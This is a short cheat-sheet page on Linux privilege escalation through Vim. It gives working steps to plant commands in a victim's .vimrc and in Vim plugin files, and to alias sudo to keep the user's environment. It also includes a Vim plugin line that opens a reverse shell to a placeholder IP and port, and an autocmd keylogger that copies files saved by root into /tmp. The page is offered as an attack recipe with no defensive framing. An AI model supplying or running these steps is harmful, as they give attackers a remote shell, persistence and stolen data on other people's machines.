---
title: Linux Privilege Escalation
layout: default
parent: Linux
nav_order: 2
---

## Identifying ##

1. Easiest way is to do the following to see what sudo can do:\
`sudo -l`

## VIM (user need to run as sudo) ##

1. Add the following line to the file .vimrc (or create if don't have):\
`:silent !source ~/.vimrunscript`

2. Next create the file /home/victim/.vimrunscript
```
#!/bin/bash
echo "hacked" > /tmp/hacksrcout.txt
```

3. If user running Ubuntu, Red Hat or similar, no extra steps needed. If running Debian or similar, need to add the following to .bashrc file:\
`alias sudo="sudo -E"`

4. After that run this (if Debian):\
`source ~/.bashrc`

## More obvious way ##
1. Adding to .vimrc file the command you want:\
`!touch /tmp/test.txt`

2. Create a file ending with .vim and following content. Move the file to the following folder ~/.vim/plugin:\
```
:silent !bash -i >& /dev/tcp/IP/PORT 0>&1
```

## VIM keylogger ##
1. This will allow the keylog to only work when the user runs vim as sudo. Add the following content to /home/victim/.vim/plugin/settings.vim:
```
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```
